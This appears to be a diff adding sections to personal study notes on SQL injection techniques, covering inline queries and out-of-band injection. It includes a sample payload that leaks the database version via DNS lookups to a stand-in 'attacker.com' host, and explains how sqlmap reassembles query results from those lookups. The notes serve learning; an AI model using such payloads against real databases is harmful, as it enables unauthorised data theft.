@@ -110,3 +110,19 @@ usually used when boolean-based is not applicable
 for example, when statement is a non-query 
 
 ### Inline queries 
+
+`SELECT (SELECT @@version) from`
+
+embeds a query within the original query  
+uncommon because it requires the web app to be written in a certain way  
+
+### Out-of-band SQL injection 
+
+`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
+
+one of the most advanced types of sqli  
+used in cases where all other types are either unsupported or too slow  
+sqlmap supports these through DNS exfiltration where requested queries are retrieved through DNS traffic  
+
+running sqlmap on the dns server for the domain under control (.attacker.com) allows sqlmap to perform the attack by forcing the server to request non-existent subdomains (foo.attacker.com) where foo would be the SQL response we want  
+sqlmap collects the erroring DNS requests and collects the foo part to form the entire sql response 
